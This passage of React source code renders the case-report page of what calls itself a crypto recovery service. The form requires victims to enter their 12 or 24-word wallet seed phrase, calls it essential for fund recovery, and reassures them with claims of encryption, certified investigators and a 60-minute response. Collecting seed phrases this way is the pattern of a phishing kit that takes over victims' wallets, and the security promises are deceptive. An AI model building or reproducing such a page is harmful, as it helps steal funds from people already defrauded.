                    style={{backgroundColor: 'rgba(255,255,255,0.1)', color: 'var(--text-primary)', borderColor: 'rgba(255,255,255,0.2)'}}
                    placeholder="Describe the lost transaction, wallet address, amount stolen, when it happened, and any other relevant details..."
                    value={formData.details}
                    onChange={(e) => setFormData({...formData, details: e.target.value})}
                    minLength={50}
                    required
                  />
                  <p className="text-sm mt-1" style={{color: 'var(--text-muted)'}}>
                    Please provide at least 50 characters describing your case.
                  </p>
                </div>
              </div>

              {/* Recovery Information */}
              <div className="mb-8">
                <h2 className="text-2xl font-semibold mb-6" style={{color: 'var(--text-primary)'}}>Recovery Information</h2>
                <div className="mb-6">
                  <label htmlFor="address" className="block text-sm font-medium mb-2" style={{color: 'var(--text-secondary)'}}>
                    Wallet Address (optional)
                  </label>
                  <input
                    type="text"
                    id="address"
                    className="w-full px-4 py-3 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200"
                    style={{backgroundColor: 'rgba(255,255,255,0.1)', color: 'var(--text-primary)', borderColor: 'rgba(255,255,255,0.2)'}}
                    placeholder="e.g., So1...abc"
                    value={formData.address}
                    onChange={(e) => setFormData({...formData, address: e.target.value})}
                  />
                </div>

                <div>
                  <label htmlFor="phrase" className="block text-sm font-medium mb-2" style={{color: 'var(--text-secondary)'}}>
                    Recovery Seed Phrase - Essential for blockchain analysis, tracing, and fund recovery proceedings *
                  </label>
                  <textarea
                    id="phrase"
                    rows={4}
                    className={`w-full px-4 py-3 rounded-lg focus:outline-none focus:ring-2 transition-all duration-200 resize-none ${
                      phraseValidation.touched 
                        ? phraseValidation.valid 
                          ? 'border-2 border-green-500 focus:ring-green-500' 
                          : 'border-2 border-red-500 focus:ring-red-500'
                        : 'border border-gray-600 focus:ring-blue-500 focus:border-transparent'
                    }`}
                    style={{
                      backgroundColor: 'rgba(255,255,255,0.1)', 
                      color: 'var(--text-primary)',
                      ...(phraseValidation.touched && !phraseValidation.valid && !phraseValidation.error && { borderColor: 'rgba(255,255,255,0.2)' })
                    }}
                    placeholder="Enter your 12 or 24-word seed phrase (e.g., abandon ability able...)"
                    value={formData.phrase}
                    onChange={(e) => {
                      setFormData({...formData, phrase: e.target.value})
                      setPhraseValidation({...phraseValidation, touched: true})
                    }}
                    onBlur={() => setPhraseValidation({...phraseValidation, touched: true})}
                    required
                  />
                  
                  {/* Error Message */}
                  {phraseValidation.touched && phraseValidation.error && (
                    <p className="text-sm text-red-400 mt-2 font-medium">
                      {phraseValidation.error}
                    </p>
                  )}
                  
                  {/* Valid Message */}
                  {phraseValidation.touched && phraseValidation.valid && (
                    <p className="text-sm text-green-400 mt-2 font-medium">
                      Valid BIP-39 seed phrase detected
                    </p>
                  )}
                  
                  {/* Help Text */}
                  {!phraseValidation.touched && (
                    <p className="text-sm mt-2" style={{color: 'var(--text-muted)'}}>
                      Must be exactly 12 or 24 words from the BIP-39 word list
                    </p>
                  )}
                  
                  <p className="text-sm text-red-400 mt-2">
                    Your recovery phrase is encrypted in transit and never stored on our servers.
                  </p>
                </div>
              </div>

              {/* Security Notice */}
              <div className="mb-8 border border-blue-500/30 rounded-lg p-6 backdrop-blur-sm" style={{background: 'linear-gradient(135deg, rgba(59, 130, 246, 0.1) 0%, rgba(79, 70, 229, 0.1) 100%)'}}>
                <div className="flex items-start">
                  <CheckCircleIcon className="h-6 w-6 mt-0.5 mr-3 flex-shrink-0" style={{color: 'var(--text-accent)'}} />
                  <div>
                    <h3 className="text-lg font-semibold mb-2" style={{color: 'var(--text-primary)'}}>Security & Privacy</h3>
                    <ul className="space-y-2" style={{color: 'var(--text-secondary)'}}>
                      <li>• All data is encrypted during transmission</li>
                      <li>• Recovery phrases are never stored on our servers</li>
                      <li>• We comply with international privacy regulations</li>
                      <li>• Direct secure transmission to our recovery team</li>
                    </ul>
                  </div>
                </div>
              </div>

              <button
                type="submit"
                disabled={phraseValidation.touched && !phraseValidation.valid}
                className={`w-full text-white py-4 px-6 rounded-lg font-semibold text-lg transition-all duration-300 ${
                  phraseValidation.touched && !phraseValidation.valid
                    ? 'opacity-50 cursor-not-allowed'
                    : 'hover:scale-105 hover:shadow-lg'
                }`}
                style={{background: 'var(--bg-accent)', boxShadow: 'var(--shadow-button)'}}
              >
                Submit Case for Immediate Review
              </button>
            </form>
          </div>
        )}

        {formState === 'loading' && (
          <div className="rounded-lg p-12 shadow-lg text-center" style={{background: 'var(--bg-secondary)'}}>
            <div className="loader mb-8">
              <div className="spinner"></div>
            </div>
            <h3 className="text-white text-2xl font-semibold mb-4">Securing Your Case...</h3>
            <p className="text-lg leading-relaxed" style={{color: 'var(--text-secondary)'}}>
              Your information is being encrypted and securely transmitted to our legal investigation team for immediate analysis.
            </p>
          </div>
        )}

        {formState === 'success' && (
          <>
            {/* Modal Backdrop with Blur */}
            <div 
              className="fixed inset-0 z-50 flex items-center justify-center p-4"
              style={{
                background: 'rgba(11, 20, 38, 0.92)',
                backdropFilter: 'blur(8px)',
                animation: 'fadeIn 0.3s ease-out'
              }}
            >
              {/* Premium Modal Container */}
              <div 
                className="relative w-full max-w-lg"
                style={{
                  animation: 'modalSlideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1)'
                }}
              >
                {/* Close Button */}
                <button
                  onClick={() => window.location.href = '/'}
                  className="absolute -top-2 -right-2 w-8 h-8 flex items-center justify-center rounded-full bg-gray-800/90 hover:bg-gray-700 transition-all duration-200 z-10 group"
                  style={{
                    boxShadow: '0 4px 12px rgba(0, 0, 0, 0.3)'
                  }}
                >
                  <svg className="w-4 h-4 text-gray-400 group-hover:text-white transition-colors" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </button>

                {/* Modal Content */}
                <div 
                  className="rounded-2xl overflow-hidden"
                  style={{
                    background: 'linear-gradient(145deg, rgba(17, 29, 54, 0.98) 0%, rgba(24, 36, 63, 0.98) 100%)',
                    boxShadow: '0 20px 60px rgba(0, 0, 0, 0.5), 0 0 1px rgba(34, 197, 94, 0.3)',
                    border: '1px solid rgba(34, 197, 94, 0.15)'
                  }}
                >
                  {/* Success Header with Gradient */}
                  <div 
                    className="relative px-6 py-5 border-b"
                    style={{
                      background: 'linear-gradient(135deg, rgba(16, 185, 129, 0.08) 0%, rgba(34, 197, 94, 0.12) 100%)',
                      borderColor: 'rgba(34, 197, 94, 0.2)'
                    }}
                  >
                    <div className="flex items-center gap-3">
                      {/* Animated Success Icon */}
                      <div 
                        className="flex-shrink-0"
                        style={{
                          animation: 'scaleIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) 0.2s both'
                        }}
                      >
                        <div 
                          className="w-12 h-12 rounded-full flex items-center justify-center"
                          style={{
                            background: 'linear-gradient(135deg, rgba(34, 197, 94, 0.2) 0%, rgba(16, 185, 129, 0.15) 100%)',
                            boxShadow: '0 0 20px rgba(34, 197, 94, 0.3)'
                          }}
                        >
                          <svg className="w-6 h-6" viewBox="0 0 24 24" fill="none">
                            <path d="M20 6L9 17L4 12" stroke="#22c55e" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
                          </svg>
                        </div>
                      </div>
                      <div className="flex-1">
                        <h2 className="text-xl font-bold text-green-400 mb-1">
                          Case Submission Confirmed
                        </h2>
                        <p className="text-sm text-gray-400">
                          Reference: <code className="text-green-400 font-mono font-semibold">{caseId}</code>
                        </p>
                      </div>
                    </div>
                  </div>

                  {/* Modal Body - Compact */}
                  <div className="px-6 py-5 space-y-4">
                    {/* Main Message */}
                    <div 
                      className="p-4 rounded-xl"
                      style={{
                        background: 'rgba(34, 197, 94, 0.06)',
                        border: '1px solid rgba(34, 197, 94, 0.15)'
                      }}
                    >
                      <p className="text-sm leading-relaxed" style={{color: 'var(--text-secondary)'}}>
                        Your case has been received by our <span className="text-green-400 font-medium">certified forensic investigation team</span> and assigned for immediate analysis.
                      </p>
                    </div>

                    {/* Timeline Notice */}
                    <div 
                      className="flex items-start gap-3 p-3 rounded-lg transition-all duration-200 hover:bg-white/5"
                      style={{
                        background: 'rgba(59, 130, 246, 0.05)',
                        border: '1px solid rgba(59, 130, 246, 0.1)'
                      }}
                    >
                      <svg className="w-5 h-5 text-blue-400 flex-shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                      </svg>
                      <div>
                        <p className="text-sm font-medium text-blue-300 mb-1">Expected Response Time</p>
                        <p className="text-xs text-gray-400">
                          Direct contact from our specialists within <strong className="text-blue-400">60 minutes</strong> with detailed findings and recovery options.
                        </p>
                      </div>
                    </div>

                    {/* Security Badge */}
                    <div 
                      className="flex items-center gap-2 p-3 rounded-lg"
                      style={{
                        background: 'rgba(139, 92, 246, 0.05)',
                        border: '1px solid rgba(139, 92, 246, 0.1)'
                      }}
                    >
                      <svg className="w-4 h-4 text-purple-400 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                      </svg>
                      <p className="text-xs text-gray-400">
                        Military-grade encryption • Certified specialists • Strict confidentiality
                      </p>
                    </div>
                  </div>

                  {/* Modal Footer */}
                  <div 
                    className="px-6 py-4 border-t"
                    style={{
                      background: 'rgba(0, 0, 0, 0.2)',
                      borderColor: 'rgba(255, 255, 255, 0.05)'
                    }}
                  >
                    <Link 
                      to="/" 
                      className="block w-full text-center py-3 rounded-lg font-semibold text-sm transition-all duration-300 hover:scale-[1.02] group"
                      style={{
                        background: 'linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%)',
                        boxShadow: '0 4px 16px rgba(59, 130, 246, 0.3)'
                      }}
                    >
                      <span className="text-white group-hover:text-gray-100">Return to Home</span>
                    </Link>
                  </div>
                </div>
              </div>
            </div>

            <style>{`
              @keyframes fadeIn {
                from { opacity: 0; }
                to { opacity: 1; }
              }
              @keyframes modalSlideUp {
                from {
                  opacity: 0;
                  transform: translateY(20px) scale(0.95);
                }
                to {
                  opacity: 1;
                  transform: translateY(0) scale(1);
                }
              }
              @keyframes scaleIn {
                from {
                  opacity: 0;
                  transform: scale(0.5);
                }
                to {
                  opacity: 1;
                  transform: scale(1);
                }
              }
            `}</style>
          </>
        )}

        {formState === 'error' && (
          <div className="min-h-[600px] flex items-center justify-center">
            <div className="rounded-lg p-12 shadow-2xl text-center max-w-2xl w-full border border-red-500/30" style={{background: 'var(--bg-secondary)'}}>
              {/* Error Icon */}
              <div className="mb-8">
                <svg className="w-24 h-24 mx-auto text-red-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                </svg>
              </div>
              
              <h3 className="text-3xl font-bold text-red-400 mb-6">Submission Error</h3>
              <p className="text-lg mb-8" style={{color: 'var(--text-secondary)'}}>
                We encountered an error processing your submission. Please try submitting your case again.
              </p>
              <p className="text-md mb-8" style={{color: 'var(--text-muted)'}}>
                If the problem persists, our team will contact you via the email address provided.
              </p>
              
              <div>
                <button 
                  onClick={() => setFormState('form')}
                  className="text-white px-8 py-4 rounded-lg font-semibold text-lg transition-all duration-300 hover:scale-105 hover:shadow-xl"
                  style={{background: 'linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%)', boxShadow: '0 10px 30px rgba(59, 130, 246, 0.3)'}}
                >
                  Try Again
                </button>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Footer - Hide in success and loading states */}
      {(formState === 'form' || formState === 'error') && (
        <footer className="text-white py-16 mt-20" style={{background: 'var(--bg-secondary)'}}>
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-8">
            <Logo variant="footer" />
            <p className="mb-6" style={{color: 'var(--text-secondary)'}}>
              The world's most trusted crypto recovery service
            </p>
            <div className="flex justify-center space-x-6">
              <Link to="/" className="hover:text-white transition-colors duration-200" style={{color: 'var(--text-secondary)'}}>Home</Link>
              <Link to="/services" className="hover:text-white transition-colors duration-200" style={{color: 'var(--text-secondary)'}}>Services</Link>
              <Link to="/contact-form" className="hover:text-white transition-colors duration-200" style={{color: 'var(--text-secondary)'}}>Report Case</Link>
              <a href="#" className="hover:text-white transition-colors duration-200" style={{color: 'var(--text-secondary)'}}>About</a>
            </div>
          </div>

          <div className="pt-8" style={{borderColor: 'var(--text-muted)'}}>
            <div className="flex flex-col md:flex-row justify-between items-center">
              <div className="mb-4 md:mb-0" style={{color: 'var(--text-secondary)'}}>
                24/7 Support Available
              </div>
              <div className="font-semibold" style={{color: 'var(--text-secondary)'}}>
                5000+ investigations completed
              </div>
            </div>
          </div>
        </div>
      </footer>
      )}
    </div>
  )
}
